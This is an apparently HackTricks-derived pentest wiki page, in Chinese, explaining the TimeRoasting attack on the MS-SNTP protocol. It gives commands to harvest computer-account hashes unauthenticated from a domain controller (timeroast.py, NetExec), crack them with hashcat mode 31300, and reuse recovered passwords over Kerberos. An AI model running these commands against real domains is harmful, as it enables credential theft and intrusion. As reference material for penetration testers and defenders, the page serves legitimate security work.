# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting 滥用 legacy MS-SNTP authentication extension。在 MS-SNTP 中，client 可以发送一个嵌入任意 computer account RID 的 68-byte request；domain controller 使用该 computer account 的 NTLM hash（MD4）作为 key，对 response 计算 MAC 后返回。<sup>[[1]](#references)</sup> 攻击者可以在未进行 authentication 的情况下收集这些 MS-SNTP MAC，并使用 Hashcat mode 31300 进行 offline cracking，从而恢复 computer account passwords。<sup>[[2]](#references)</sup>

有关详细信息，请参阅官方 MS-SNTP spec 中的第 3.1.5.1 节“Authentication Request Behavior”和第 4 节“Protocol Examples”。<sup>[[1]](#references)</sup>
![TimeRoasting：有关详细信息，请参阅官方 MS-SNTP spec 中的第 3.1.5.1 节“Authentication Request Behavior”和第 4 节“Protocol Examples”](../../images/Pasted%20image%2020250709114508.png)
当 ExtendedAuthenticatorSupported ADM element 为 false 时，client 会发送一个 68-byte request，并将 RID 嵌入 authenticator 的 Key Identifier subfield 的最低有效 31 bits 中。<sup>[[1]](#references)</sup>

> 如果 ExtendedAuthenticatorSupported ADM element 为 false，client MUST 构造一个 Client NTP Request message。Client NTP Request message 的长度为 68 bytes。client 按照第 2.2.1 节中的说明设置 Client NTP Request message 的 Authenticator field，将 RID value 的最低有效 31 bits 写入 authenticator 的 Key Identifier subfield 的最低有效 31 bits，然后将 Key Selector value 写入 Key Identifier subfield 的最高有效 bit。<sup>[[1]](#references)</sup>

来自第 4 节（Protocol Examples）：

> 收到 request 后，server 会验证接收到的 message size 是否为 68 bytes。在接收到的 message size 为 68 bytes 的情况下，server 从接收到的 message 中提取 RID。server 使用该 RID 调用 NetrLogonComputeServerDigest method（如 [MS-NRPC] 第 3.5.4.8.2 节所述）来计算 crypto-checksums，并根据接收到的 message 中 Key Identifier subfield 的最高有效 bit，按照第 3.2.5 节的规定选择 crypto-checksum。随后，server 向 client 发送 response，将 Key Identifier field 设置为 0，并将 Crypto-Checksum field 设置为计算出的 crypto-checksum。<sup>[[1]](#references)</sup>

该 crypto-checksum 基于 MD5（参见 3.2.5.1.1），可以进行 offline cracking，从而实现 roasting attack。<sup>[[1]](#references)</sup>

## 如何进行 Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort 编写的 Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## 使用 NetExec + Hashcat 进行实际攻击（未认证）

- NetExec 可以在未认证的情况下枚举并收集计算机 RID 对应的 MS-SNTP MAC，并输出可直接用于 cracking 的 $sntp-ms$ hashes：<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- 使用 Hashcat mode 31300 (MS-SNTP MAC) 进行离线破解：<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 恢复的明文对应于计算机账户密码。在禁用 NTLM 时，尝试直接将其作为机器账户通过 Kerberos（-k）使用：
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
操作提示
- 在使用 Kerberos 前确保时间同步准确：`sudo ntpdate <dc_fqdn>`
- 如有需要，为 AD realm 生成 krb5.conf：`netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 获取任意 authenticated foothold 后，可通过 LDAP/BloodHound 将 RIDs 映射到 principals。

## 参考资料

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting 白皮书](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – 官方文档](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
